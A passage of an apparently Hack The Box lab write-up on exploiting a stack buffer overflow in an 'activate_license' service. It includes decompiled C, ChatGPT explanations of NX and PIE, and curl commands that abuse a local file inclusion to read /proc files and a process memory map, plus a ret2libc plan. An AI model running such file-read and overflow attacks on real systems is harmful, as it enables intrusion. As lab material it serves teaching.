+</span></span><span style="display:flex;"><span>    v2 <span style="color:#f92672">=</span> strerror(<span style="color:#f92672">*</span>v1);
+</span></span><span style="display:flex;"><span>    error(v2);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  msglen <span style="color:#f92672">=</span> ntohl(msglen);
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;[+] reading %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, msglen);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( read(sockfd, buffer, msglen) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> __errno_location();
+</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> strerror(<span style="color:#f92672">*</span>v3);
+</span></span><span style="display:flex;"><span>    error(v4);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sqlite3_open(<span style="color:#e6db74">&#34;license.sqlite&#34;</span>, <span style="color:#f92672">&amp;</span>db) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)sqlite3_errmsg(db);
+</span></span><span style="display:flex;"><span>    error(v5);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  sqlite3_busy_timeout(db, <span style="color:#ae81ff">2000LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sqlite3_exec(
+</span></span><span style="display:flex;"><span>                       db,
+</span></span><span style="display:flex;"><span>                       <span style="color:#e6db74">&#34;CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,   license_key TEXT)&#34;</span>,
+</span></span><span style="display:flex;"><span>                       <span style="color:#ae81ff">0LL</span>,
+</span></span><span style="display:flex;"><span>                       <span style="color:#ae81ff">0LL</span>,
+</span></span><span style="display:flex;"><span>                       <span style="color:#ae81ff">0LL</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v6 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)sqlite3_errmsg(db);
+</span></span><span style="display:flex;"><span>    error(v6);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sqlite3_prepare_v2(db, <span style="color:#e6db74">&#34;INSERT INTO license (license_key) VALUES (?)&#34;</span>, <span style="color:#ae81ff">0xFFFFFFFFLL</span>, <span style="color:#f92672">&amp;</span>stmt, <span style="color:#ae81ff">0LL</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v7 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)sqlite3_errmsg(db);
+</span></span><span style="display:flex;"><span>    error(v7);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sqlite3_bind_text(stmt, <span style="color:#ae81ff">1LL</span>, buffer, <span style="color:#ae81ff">512LL</span>, <span style="color:#ae81ff">0LL</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v8 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)sqlite3_errmsg(db);
+</span></span><span style="display:flex;"><span>    error(v8);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sqlite3_step(stmt) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">101</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v9 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)sqlite3_errmsg(db);
+</span></span><span style="display:flex;"><span>    error(v9);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sqlite3_reset(stmt) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v10 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)sqlite3_errmsg(db);
+</span></span><span style="display:flex;"><span>    error(v10);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sqlite3_finalize(stmt) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v11 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)sqlite3_errmsg(db);
+</span></span><span style="display:flex;"><span>    error(v11);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sqlite3_close(db) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v12 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)sqlite3_errmsg(db);
+</span></span><span style="display:flex;"><span>    error(v12);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;[+] activated license: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li>chatGPT Explanation: (Very accurate :P)
+<ul>
+<li>When chatGPT talks, i don&rsquo;t have anything to add :) .</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>The <span style="color:#e6db74">`activate_license`</span> function is a function that is called with a socket file descriptor, <span style="color:#e6db74">`sockfd`</span>, when a new client connection is accepted by the server. The function reads a message of a specified length from the client using the <span style="color:#e6db74">`read`</span> function, and then stores the message in a buffer. It then uses the <span style="color:#e6db74">`sqlite3`</span> library to create and open a SQLite database file called &#34;license.sqlite&#34; if it does not already exist, and creates a table called &#34;license&#34; in the database if it does not already exist.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The function then prepares an SQL statement to insert the license key contained in the buffer into the &#34;license&#34; table, binds the license key to the statement, and then executes the statement. If any errors occur during these steps, the code calls the <span style="color:#e6db74">`error`</span> function with a description of the error.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Finally, the function prints a message indicating that the license has been activated, and then returns.
+</span></span></code></pre></div><h4 id="stack-smashing-exploiting-buffer-overflow-vulnerability">Stack smashing: Exploiting buffer overflow vulnerability</h4>
+<ul>
+<li><strong>ChatGPT</strong> explanation for buffer overflow:</li>
+</ul>
+<blockquote>
+<p>A buffer overflow is a type of vulnerability that occurs when a program writes more data to a buffer than the buffer is allocated to hold. This can happen, for example, when a program uses a fixed-length buffer to store user input, but the user provides more input than the buffer can hold. When this occurs, the extra data can overwrite adjacent memory, potentially corrupting or overwriting important data structures used by the program. In some cases, this can allow an attacker to execute arbitrary code by providing carefully crafted input that overwrites the program&rsquo;s execution flow.</p>
+</blockquote>
+<ul>
+<li>Thanks chatGPT :*</li>
+</ul>
+<h5 id="the-vulnerability-root-cause-its-the-time-to-say-good-buy-to-chatgpt">The vulnerability root cause (it&rsquo;s the time to say good buy to chatGPT):</h5>
+<ul>
+<li>After reading this code snippet from <code>activate_license</code> function</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// code snippet - 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>....
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> ( read(sockfd, <span style="color:#f92672">&amp;</span>msglen, <span style="color:#ae81ff">4uLL</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>....
+</span></span></code></pre></div><ul>
+<li>After reciving a successful connection (the program listning at 127.0.0.1:1337), <code>activate_license</code> function read the message len (<code>msglen</code> variable) from the socket file descriptor (<code>sockfd</code>) (take user input and put it into a variable - INPUT-1)</li>
+<li>Based on the <code>msglen</code> variable the following code snippet read into the buffer variable data receivaed from the socket file descriptor (<code>sockfd</code>) (another user input - INPUT-2)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// code snippet - 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>.....
+</span></span><span style="display:flex;"><span>  msglen <span style="color:#f92672">=</span> ntohl(msglen); <span style="color:#75715e">// The ntohl() function converts the unsigned integer netlong from network byte order to host byte order.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  printf(<span style="color:#e6db74">&#34;[+] reading %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, msglen);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( read(sockfd, buffer, msglen) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>.....
+</span></span></code></pre></div><ul>
+<li>
+<p>The problem here is that the function used to read the data from <code>sockfd</code> and put it into the <code>buffer</code> variable is insecure (<code>read</code> from c standard library) . There is no boundary validation and the buffer (<code>char buffer[512];</code>) size is limited to (512 x 1 byte (char size in C language) = 512 byte), the user can enter too much data and overflow the <code>buffer</code> variable.</p>
+</li>
+<li>
+<p><code>read</code> function manual page:</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># man 2 read</span>
+</span></span><span style="display:flex;"><span>READ<span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>                                              Linux Programmer<span style="color:#960050;background-color:#1e0010">&#39;</span>s Manual                                             READ<span style="color:#f92672">(</span>2<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NAME
+</span></span><span style="display:flex;"><span>       read - read from a file descriptor
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SYNOPSIS
+</span></span><span style="display:flex;"><span>       <span style="color:#75715e">#include &lt;unistd.h&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       ssize_t read<span style="color:#f92672">(</span>int fd, void *buf, size_t count<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DESCRIPTION
+</span></span><span style="display:flex;"><span>       read<span style="color:#f92672">()</span> attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.
+</span></span></code></pre></div><ul>
+<li>
+<p>ChatGPT opinion:
+![[Pasted image 20221208165806.png]]</p>
+</li>
+<li>
+<p>Actually the probem here is not with the read function itslef. It&rsquo;s with reading the message len from the user input and then attempt to read <code>msglen</code> from the user input into a limited size <code>buffer</code> variable.</p>
+</li>
+</ul>
+<p>![[buffer-1.png]]</p>
+<ul>
+<li>So now if i enter the <code>msglen</code> as <code>520 bytes</code> the program will attempt to read 520 bytes from the <code>sockfd</code> into a 512 bytes <code>buffer</code> variable. Overflow!!!</li>
+</ul>
+<p>![[buffer-2.png]]</p>
+<ul>
+<li>The most important question how to communicate wirh a process litning at localhost?
+<ul>
+<li>Do you miss me?</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># activate_license.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_FILES[<span style="color:#e6db74">&#39;licensefile&#39;</span>])) {
+</span></span><span style="display:flex;"><span>    $license      <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($_FILES[<span style="color:#e6db74">&#39;licensefile&#39;</span>][<span style="color:#e6db74">&#39;tmp_name&#39;</span>]);
+</span></span><span style="display:flex;"><span>    $license_size <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;licensefile&#39;</span>][<span style="color:#e6db74">&#39;size&#39;</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    $socket <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket_create</span>(<span style="color:#a6e22e">AF_INET</span>, <span style="color:#a6e22e">SOCK_STREAM</span>, <span style="color:#a6e22e">SOL_TCP</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$socket) { <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;error socket_create()</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>; }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">socket_connect</span>($socket, <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">1337</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;error socket_connect()&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">socket_strerror</span>(<span style="color:#a6e22e">socket_last_error</span>()) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socket_write</span>($socket, <span style="color:#a6e22e">pack</span>(<span style="color:#e6db74">&#34;N&#34;</span>, $license_size));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socket_write</span>($socket, $license);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socket_shutdown</span>($socket);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">socket_close</span>($socket);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><ul>
+<li>All what we need to do is to create a crafted licensefile and submit it via the file upload functionality.</li>
+<li>The cradted file will exploit the vulnerability and give us access to the remote machine.</li>
+<li><strong>Note</strong>:
+<blockquote>
+<p>I thinked about exploiting SQL injection vuln but the application prepare query fucntion which means that the program is safe against SQL injection vuln.</p>
+</blockquote>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)sqlite3_prepare_v2(db, <span style="color:#e6db74">&#34;INSERT INTO license (license_key) VALUES (?)&#34;</span>, <span style="color:#ae81ff">0xFFFFFFFFLL</span>, <span style="color:#f92672">&amp;</span>stmt, <span style="color:#ae81ff">0LL</span>) )
+</span></span></code></pre></div><h4 id="debugging-and-binary-exploitaion">Debugging and Binary exploitaion:</h4>
+<h5 id="checking-the-security-flags-applied-to-the-binary-file">Checking the security flags applied to the binary file:</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ checksec --file activate_license
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/xh41/HTBMachines/Retired_Box/activate_licens&#39;</span>
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
+</span></span></code></pre></div><ul>
+<li>What is nx protection? (ChatGPT)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>NX protection, also known as &#34;non-executable memory&#34;, is a security feature that prevents the execution of code from certain memory regions, such as the stack and the heap. This can help to protect against certain types of exploits, such as buffer overflows, that attempt to execute arbitrary code by writing it to these memory regions and then executing it.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NX protection is often used with binary files, such as executables and shared libraries, to prevent attackers from executing code that has been written to these memory regions. This can provide an additional layer of security for the program, making it more difficult for attackers to exploit vulnerabilities in the program.
+</span></span></code></pre></div><ul>
+<li>What is PIE protection? (ChatGPT)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>PIE, which stands for &#34;position-independent executable&#34;, is a protection used with binary files to make them resistant to memory-related exploits. When a binary file is compiled as a PIE, the compiler generates code that can be loaded at any memory address without breaking the program. This means that an attacker cannot predict the memory layout of the program, and therefore cannot easily exploit vulnerabilities such as buffer overflows.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PIE protection is often used in conjunction with other security features, such as NX protection, to provide additional security for binary files. It is particularly useful for programs that are likely to be targeted by attackers, such as servers and other critical applications.
+</span></span></code></pre></div><ul>
+<li>Address randomization protection enabled (ASLR) into the remte machine</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ curl <span style="color:#e6db74">&#34;http://10.10.11.154/index.php?page=php://filter/resource=/proc/sys/kernel/randomize_va_space&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#75715e"># means full address layout randomization</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>Thanks ChatGPT :).</p>
+</li>
+<li>
+<p>Too many protection!!! difficult to exploit!!!</p>
+<ul>
+<li>NX enabled: bypass return to libc (ret2libc)</li>
+<li>PIE enabled: leak one memory address</li>
+<li>ASLR we have access to the machine files so we can get the memory maps of the <code>activate_licens</code> binary file (<em>Everyting on linux is a file</em>)</li>
+</ul>
+</li>
+<li>
+<p>Hola!, Do you remember me?</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ curl <span style="color:#e6db74">&#34;http://10.10.11.154/index.php?page=php://filter/resource=&lt;FileToRead&gt;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ curl http://10.10.11.154/index.php?page<span style="color:#f92672">=</span>php://filter/resource<span style="color:#f92672">=</span>/proc/sched_debug --output sched_debug
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ grep activate sched_debug <span style="color:#75715e"># proces id 401</span>
+</span></span><span style="display:flex;"><span> S activate_licens   <span style="color:#ae81ff">401</span>      2992.578475         <span style="color:#ae81ff">8</span>   <span style="color:#ae81ff">120</span>         0.000000         3.256014         0.000000 <span style="color:#ae81ff">0</span> <span style="color:#ae81ff">0</span> /
+</span></span></code></pre></div><ul>
+<li>Get the running process memory layout from maps file:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~
+</span></span><span style="display:flex;"><span>❯ curl <span style="color:#e6db74">&#34;http://10.10.11.154/index.php?page=/proc/401/maps&#34;</span>
+</span></span><span style="display:flex;"><span>55ab7331f000-55ab73320000 r--p <span style="color:#ae81ff">00000000</span> 08:01 <span style="color:#ae81ff">2408</span>                       /usr/bin/activate_license
+</span></span><span style="display:flex;"><span>55ab73320000-55ab73321000 r-xp <span style="color:#ae81ff">00001000</span> 08:01 <span style="color:#ae81ff">2408</span>                       /usr/bin/activate_license
+</span></span><span style="display:flex;"><span>55ab73321000-55ab73322000 r--p <span style="color:#ae81ff">00002000</span> 08:01 <span style="color:#ae81ff">2408</span>                       /usr/bin/activate_license
+</span></span><span style="display:flex;"><span>55ab73322000-55ab73323000 r--p <span style="color:#ae81ff">00002000</span> 08:01 <span style="color:#ae81ff">2408</span>                       /usr/bin/activate_license
+</span></span><span style="display:flex;"><span>55ab73323000-55ab73324000 rw-p <span style="color:#ae81ff">00003000</span> 08:01 <span style="color:#ae81ff">2408</span>                       /usr/bin/activate_license
+</span></span><span style="display:flex;"><span>55ab73e0e000-55ab73e2f000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>                          <span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>7f4b238d3000-7f4b238d5000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>7f4b238d5000-7f4b238d6000 r--p <span style="color:#ae81ff">00000000</span> 08:01 <span style="color:#ae81ff">3635</span>                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+</span></span><span style="display:flex;"><span>7f4b238d6000-7f4b238d8000 r-xp <span style="color:#ae81ff">00001000</span> 08:01 <span style="color:#ae81ff">3635</span>                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+</span></span><span style="display:flex;"><span>7f4b238d8000-7f4b238d9000 r--p <span style="color:#ae81ff">00003000</span> 08:01 <span style="color:#ae81ff">3635</span>                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+</span></span><span style="display:flex;"><span>7f4b238d9000-7f4b238da000 r--p <span style="color:#ae81ff">00003000</span> 08:01 <span style="color:#ae81ff">3635</span>                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+</span></span><span style="display:flex;"><span>7f4b238da000-7f4b238db000 rw-p <span style="color:#ae81ff">00004000</span> 08:01 <span style="color:#ae81ff">3635</span>                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+</span></span><span style="display:flex;"><span>7f4b238db000-7f4b238e2000 r--p <span style="color:#ae81ff">00000000</span> 08:01 <span style="color:#ae81ff">3645</span>                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+</span></span><span style="display:flex;"><span>7f4b238e2000-7f4b238f2000 r-xp <span style="color:#ae81ff">00007000</span> 08:01 <span style="color:#ae81ff">3645</span>                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+</span></span><span style="display:flex;"><span>7f4b238f2000-7f4b238f7000 r--p <span style="color:#ae81ff">00017000</span> 08:01 <span style="color:#ae81ff">3645</span>                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+</span></span><span style="display:flex;"><span>7f4b238f7000-7f4b238f8000 r--p 0001b000 08:01 <span style="color:#ae81ff">3645</span>                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+</span></span><span style="display:flex;"><span>7f4b238f8000-7f4b238f9000 rw-p 0001c000 08:01 <span style="color:#ae81ff">3645</span>                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+</span></span><span style="display:flex;"><span>7f4b238f9000-7f4b238fd000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>7f4b238fd000-7f4b2390c000 r--p <span style="color:#ae81ff">00000000</span> 08:01 <span style="color:#ae81ff">3636</span>                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+</span></span><span style="display:flex;"><span>7f4b2390c000-7f4b239a6000 r-xp 0000f000 08:01 <span style="color:#ae81ff">3636</span>                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+</span></span><span style="display:flex;"><span>7f4b239a6000-7f4b23a3f000 r--p 000a9000 08:01 <span style="color:#ae81ff">3636</span>                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23a3f000-7f4b23a40000 r--p <span style="color:#ae81ff">00141000</span> 08:01 <span style="color:#ae81ff">3636</span>                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23a40000-7f4b23a41000 rw-p <span style="color:#ae81ff">00142000</span> 08:01 <span style="color:#ae81ff">3636</span>                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23a41000-7f4b23a66000 r--p <span style="color:#ae81ff">00000000</span> 08:01 <span style="color:#ae81ff">3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23a66000-7f4b23bb1000 r-xp <span style="color:#ae81ff">00025000</span> 08:01 <span style="color:#ae81ff">3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23bb1000-7f4b23bfb000 r--p <span style="color:#ae81ff">00170000</span> 08:01 <span style="color:#ae81ff">3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23bfb000-7f4b23bfc000 ---p 001ba000 08:01 <span style="color:#ae81ff">3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23bfc000-7f4b23bff000 r--p 001ba000 08:01 <span style="color:#ae81ff">3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23bff000-7f4b23c02000 rw-p 001bd000 08:01 <span style="color:#ae81ff">3634</span>                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23c02000-7f4b23c06000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>7f4b23c06000-7f4b23c16000 r--p <span style="color:#ae81ff">00000000</span> 08:01 <span style="color:#ae81ff">5321</span>                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+</span></span><span style="display:flex;"><span>7f4b23c16000-7f4b23d0e000 r-xp <span style="color:#ae81ff">00010000</span> 08:01 <span style="color:#ae81ff">5321</span>                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+</span></span><span style="display:flex;"><span>7f4b23d0e000-7f4b23d42000 r--p <span style="color:#ae81ff">00108000</span> 08:01 <span style="color:#ae81ff">5321</span>                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+</span></span><span style="display:flex;"><span>7f4b23d42000-7f4b23d46000 r--p 0013b000 08:01 <span style="color:#ae81ff">5321</span>                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+</span></span><span style="display:flex;"><span>7f4b23d46000-7f4b23d49000 rw-p 0013f000 08:01 <span style="color:#ae81ff">5321</span>                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+</span></span><span style="display:flex;"><span>7f4b23d49000-7f4b23d4b000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>7f4b23d50000-7f4b23d51000 r--p <span style="color:#ae81ff">00000000</span> 08:01 <span style="color:#ae81ff">3630</span>                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
+</span></span><span style="display:flex;"><span>7f4b23d51000-7f4b23d71000 r-xp <span style="color:#ae81ff">00001000</span> 08:01 <span style="color:#ae81ff">3630</span>                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
